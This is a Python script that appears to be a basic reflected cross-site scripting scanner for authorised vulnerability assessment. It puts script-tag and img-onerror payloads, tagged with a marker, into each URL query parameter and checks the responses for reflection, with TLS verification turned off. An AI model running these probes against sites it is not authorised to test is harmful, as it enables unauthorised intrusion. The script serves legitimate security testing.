import argparse
import json
from pathlib import Path
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import requests


DEFAULT_TIMEOUT = 10

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
]

REFLECTION_MARKER = "VAPT_XSS_TEST_7F3A"


def find_parameters(url):
    parsed = urlparse(url)

    return [
        key
        for key, _ in parse_qsl(
            parsed.query,
            keep_blank_values=True
        )
    ]


def build_test_url(url, parameter, payload):
    parsed = urlparse(url)

    query = parse_qsl(
        parsed.query,
        keep_blank_values=True
    )

    updated_query = []

    for key, value in query:
        if key == parameter:
            updated_query.append(
                (key, payload)
            )
        else:
            updated_query.append(
                (key, value)
            )

    new_query = urlencode(
        updated_query
    )

    return urlunparse(
        (
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment,
        )
    )


def test_parameter(url, parameter, timeout=DEFAULT_TIMEOUT):
    findings = []

    test_payloads = [
        payload.replace(
            "XSS",
            REFLECTION_MARKER
        )
        for payload in XSS_PAYLOADS
    ]

    for payload in test_payloads:
        test_url = build_test_url(
            url,
            parameter,
            payload
        )

        try:
            response = requests.get(
                test_url,
                timeout=timeout,
                verify=False
            )

            if REFLECTION_MARKER in response.text:
                findings.append(
                    {
                        "parameter": parameter,
                        "payload": payload,
                        "url": test_url,
                        "status": response.status_code,
                        "reflection": True,
                        "response_length": len(
                            response.content
                        ),
                    }
                )

        except requests.RequestException as error:
            print(
                f"[!] Request failed for "
                f"{parameter}: {error}"
            )

    return findings


def scan_url(url):
    parameters = find_parameters(url)

    if not parameters:
        print(
            "[!] No URL parameters found."
        )
        return []

    print(
        f"[+] Found {len(parameters)} "
        f"parameter(s): "
        f"{', '.join(parameters)}"
    )

    findings = []

    for parameter in parameters:
        print(
            f"[+] Testing parameter: "
            f"{parameter}"
        )

        results = test_parameter(
            url,
            parameter
        )

        findings.extend(results)

    return findings


def save_results(findings):
    Path("results").mkdir(
        exist_ok=True
    )

    output_file = Path(
        "results/xss_results.json"
    )

    with open(
        output_file,
        "w",
        encoding="utf-8"
    ) as file:
        json.dump(
            findings,
            file,
            indent=4
        )

    print(
        f"[+] Results saved to "
        f"{output_file}"
    )


def main():
    parser = argparse.ArgumentParser(
        description=(
            "Basic reflected XSS "
            "assessment scanner"
        )
    )

    parser.add_argument(
        "url",
        help=(
            "Authorized URL containing "
            "query parameters"
        )
    )

    args = parser.parse_args()

    print(
        "========== XSS SCANNER ==========\n"
    )

    findings = scan_url(
        args.url
    )

    print(
        "\n========== RESULTS ==========\n"
    )

    if findings:
        for finding in findings:
            print(
                "[!] Possible reflected XSS "
                "indicator"
            )
            print(
                f"    Parameter: "
                f"{finding['parameter']}"
            )
            print(
                f"    Payload: "
                f"{finding['payload']}"
            )
            print(
                f"    Status: "
                f"{finding['status']}"
            )
    else:
        print(
            "[+] No reflected XSS "
            "indicators detected."
        )

    save_results(
        findings
    )


if __name__ == "__main__":
    main()
